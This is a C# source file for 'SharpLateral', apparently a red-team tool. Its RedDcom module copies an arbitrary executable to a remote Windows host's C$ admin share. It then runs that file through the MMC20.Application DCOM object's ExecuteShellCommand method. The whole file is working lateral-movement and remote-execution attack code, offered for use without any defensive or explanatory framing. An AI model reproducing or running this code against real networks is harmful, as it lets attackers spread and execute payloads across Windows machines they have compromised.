using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace SharpLateral
{
    class RedDcom
    {
        [DllImport("ole32.dll")]
        private static extern int CoInitializeEx(IntPtr pvReserved, uint dwCoInit);

        public static void Dcomexec(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: SharpLateral reddcom Client2 C:\\Users\\Administrator\\Desktop\\d.exe");
                return;
            }

            string hedefIp = args[0];
            string dosyaYolu = args[1];

            try
            {
                string dosyaAdi = System.IO.Path.GetFileName(dosyaYolu);
                string hedefCShareYolu = $@"\\{hedefIp}\C$\Windows\Temp\{dosyaAdi}";

                System.IO.File.Copy(dosyaYolu, hedefCShareYolu, true);

                Console.WriteLine("File copied via MMC20 Application..");

                string ProgID = "MMC20.Application";

                Type comType = Type.GetTypeFromProgID(ProgID, hedefIp);
                dynamic remoteComObject = Activator.CreateInstance(comType);

                dynamic document = remoteComObject.Document;
                dynamic activeView = document.ActiveView;

                string command = "cmd.exe";
                string parameters = $"/c start {hedefCShareYolu}";
                int flags = 7;

                activeView.ExecuteShellCommand(command, null, parameters, flags);

                Console.WriteLine("File succesfully executed via DCOM");
            }
            catch (UnauthorizedAccessException ex)
            {
                Console.Error.WriteLine("Unauthorized Access: " + ex.Message);
            }
            catch (System.Runtime.InteropServices.COMException ex)
            {
                Console.Error.WriteLine("COM Exception: " + ex.Message);
            }
            catch (Exception ex)
            {
                Console.Error.WriteLine("An error occurred: " + ex.Message);
            }
        }
    }
}
